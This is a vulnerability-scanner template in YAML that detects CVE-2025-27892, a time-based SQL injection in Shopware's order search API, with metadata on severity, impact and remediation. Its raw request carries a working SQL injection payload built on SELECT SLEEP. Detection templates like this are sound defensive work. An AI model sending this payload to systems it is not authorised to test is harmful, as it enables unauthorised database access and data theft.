http:
- matchers:
  - condition: and
    dsl:
    - 'contains(body, "Warning: Undefined array")'
    - contains(content_type, "application/json")
    - status_code == 500
    - duration>=5
    type: dsl
  raw:
  - "@timeout: 30s\nPOST /api/search/order HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:\
    \ Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0\n\
    Accept: */*\nAuthorization: Bearer {{token}}\nContent-type: application/json\n\
    \n{\n  \"filter\": [\n    {\n      \"type\": \"equals\",\n      \"field\": \"\
    transactions.stateMachineState.technicalName\",\n      \"value\": \"paid` FROM\
    \ `order`; SELECT SLEEP(7); -- \"\n    }\n  ],\n  \"aggregations\": [\n    {\n\
    \      \"type\": \"histogram\",\n      \"name\": \"order_sum_bucket\",\n     \
    \ \"field\": \"orderDateTime\",\n      \"interval\": \"day\",\n      \"aggregation\"\
    : {\n        \"type\": \"sum\",\n        \"name\": \"totalAmount ? ? --\",\n \
    \       \"field\": \"amountTotal\"\n      }\n    }\n  ]\n}\n"
id: CVE-2025-27892
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2025-27892
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:L
    cvss-score: 6.8
    cwe-id: CWE-89
    epss-percentile: 0.84655
    epss-score: 0.02413
  description: 'The Shopware application API contains a search functionality which
    enables users to search through information stored within their Shopware instance.
    The searches performed by this function can be aggregated using the parameters
    in the "aggregations" object. The name field in this "aggregations" in nested
    object is vulnerable SQL-injection and can be exploited using SQL parameters.

    '
  impact: 'Authenticated attackers can execute arbitrary SQL queries through the aggregations
    parameter in the search API, potentially extracting sensitive data from the Shopware
    database.

    '
  metadata:
    max-request: 1
    product: shopware
    vendor: shopware
    verified: true
  name: Shopware < 6.5.8.13 - SQL Injection
  reference:
  - https://www.redteam-pentesting.de/en/advisories/rt-sa-2025-001/
  - https://nvd.nist.gov/vuln/detail/CVE-2025-27892
  remediation: 'Upgrade to Shopware version 6.5.8.13 or later that properly sanitizes
    the aggregations parameter.

    '
  severity: critical
  tags: cve,cve2025,shopware,sqli,time-based-sqli,vuln
variables:
  token: '{{token}}'
